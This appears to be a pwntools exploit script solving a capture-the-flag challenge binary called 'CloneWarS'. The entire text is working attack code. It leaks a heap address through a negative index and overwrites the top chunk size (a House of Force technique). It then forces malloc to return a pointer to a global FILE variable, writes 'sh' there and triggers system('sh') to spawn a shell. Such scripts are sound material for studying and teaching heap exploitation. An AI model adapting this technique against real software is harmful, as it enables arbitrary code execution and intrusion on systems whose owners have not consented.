from pwn import *
binary_name = "./CloneWarS"
r = process(binary_name)
elf = ELF(binary_name)
context.arch = 'amd64'


def r2d2(n):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('R2? ', '2')

def pstarships(size, kind, capacity):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('Master, the amount of starships: ', str(size))
    r.sendlineafter('What kind of starships?: ', kind)
    r.sendlineafter('Capacity of troopers in the starships: ', str(capacity))

def lightsabers(nLs, color):
    r.sendlineafter('Your choice: ', '5')
    r.sendafter('How many lightsabers do you think you will need?: ', '\n')
    r.sendline(str(nLs))
    r.sendafter('What color would you like on your light sabers: ', color)

def buildDeathStar(size):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('Assemble death star: ',str(size))
    

# LEAKING HEAP
pstarships(0x30, 'A', 0x30)
r2d2(-1)
r.recvuntil('R2D2 IS .... ')
leak_heap = int(r.recvregex(r'(\d+) '))



pstarships(0x30, "FF", 0x40) # Overflow Top Chunk

# we want to write  at FILE global 
r.sendlineafter('Your choice: ', '6')
r.recvuntil('File is at: ')
FILE = int(r.recvline().rstrip())


# Now we calculate the evilsize required to write at FILE can be done with FILE-TOP_CHUNK-8*4
heapBase = leak_heap-0x1380  
offset = 0x12e0 # TOP_CHUNK offset
sizeof_long = 0x8 # 8 in 64 bits
TOP_CHUNK = heapBase+offset+sizeof_long*4
r.sendlineafter('Your choice: ', '1')
buildDeathStar(FILE-TOP_CHUNK) # Malloc will return an arbitrary pointer to FILE

# Now we write sh into file
r.sendlineafter('Your choice: ', '4')
r.sendlineafter('What kind of troopers?: ', 'sh')
r.sendlineafter('Your choice: ', '6') # Trigger system("sh")
r.interactive()
r.close()
